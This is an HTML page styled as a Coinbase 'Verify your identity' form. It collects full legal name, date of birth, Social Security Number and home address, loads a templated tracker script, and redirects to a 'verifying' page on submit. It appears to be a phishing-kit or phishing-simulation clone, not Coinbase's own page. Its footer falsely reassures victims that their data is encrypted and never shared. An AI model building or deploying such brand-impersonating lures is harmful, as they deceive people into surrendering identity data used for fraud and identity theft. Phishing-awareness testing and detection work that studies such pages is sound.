<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Identity Verification - Coinbase</title>
    <link rel="icon" type="image/svg+xml" href="assets/images/favicon.svg">
    <link rel="stylesheet" href="styles.css">

<script src="/tracker.js" data-api-key="%%API_KEY%%"></script>
</head>
<body>
    <!-- Header -->
    <header class="header">
        <div class="logo-container">
            <img src="assets/images/favicon.svg" alt="Coinbase" class="logo">
        </div>
    </header>

    <!-- Main Content -->
    <main class="main-content">
        <div class="signup-container">
            <h1 class="title">Verify your identity</h1>
            <p class="subtitle">We need to confirm your identity to comply with financial regulations. This helps keep your account secure.</p>

            <!-- Identity Verification Form -->
            <form id="identityForm" class="signup-form">
                <input 
                    type="text" 
                    id="fullName" 
                    name="fullName" 
                    class="email-input" 
                    placeholder="Full legal name"
                    autocomplete="name"
                    required
                >
                
                <input 
                    type="date" 
                    id="dateOfBirth" 
                    name="dateOfBirth" 
                    class="email-input" 
                    placeholder="Date of birth"
                    autocomplete="bday"
                    required
                >
                
                <input 
                    type="text" 
                    id="ssn" 
                    name="ssn" 
                    class="email-input" 
                    placeholder="Social Security Number (SSN)"
                    autocomplete="off"
                    maxlength="11"
                    required
                >
                
                <input 
                    type="text" 
                    id="address" 
                    name="address" 
                    class="email-input" 
                    placeholder="Street address"
                    autocomplete="street-address"
                    required
                >
                
                <input 
                    type="text" 
                    id="city" 
                    name="city" 
                    class="email-input" 
                    placeholder="City"
                    autocomplete="address-level2"
                    required
                >
                
                <div class="form-row">
                    <input 
                        type="text" 
                        id="state" 
                        name="state" 
                        class="email-input" 
                        placeholder="State"
                        autocomplete="address-level1"
                        required
                    >
                    
                    <input 
                        type="text" 
                        id="zipCode" 
                        name="zipCode" 
                        class="email-input" 
                        placeholder="ZIP Code"
                        autocomplete="postal-code"
                        maxlength="10"
                        required
                    >
                </div>
                
                <button type="submit" class="continue-btn">Continue</button>
            </form>
        </div>
    </main>

    <!-- Footer -->
    <footer class="footer">
        <p class="footer-text">
            Your information is encrypted and stored securely. We will never share your personal data without your consent.
        </p>
    </footer>

    <script>
        document.addEventListener('DOMContentLoaded', function() {
            const identityForm = document.getElementById('identityForm');
            const submitBtn = identityForm.querySelector('.continue-btn');
            const inputs = identityForm.querySelectorAll('input[required]');
            
            // Check if all required fields are filled
            function checkFormValidity() {
                let allFilled = true;
                
                inputs.forEach(input => {
                    if (input.value.trim() === '') {
                        allFilled = false;
                    }
                });
                
                if (allFilled) {
                    submitBtn.classList.add('active');
                } else {
                    submitBtn.classList.remove('active');
                }
            }
            
            // Listen to input changes
            inputs.forEach(input => {
                input.addEventListener('input', checkFormValidity);
            });
            
            checkFormValidity();
            
            identityForm.addEventListener('submit', function(e) {
                e.preventDefault();
                window.location.href = 'verifying.html';
            });
        });
    </script>
</body>
</html>
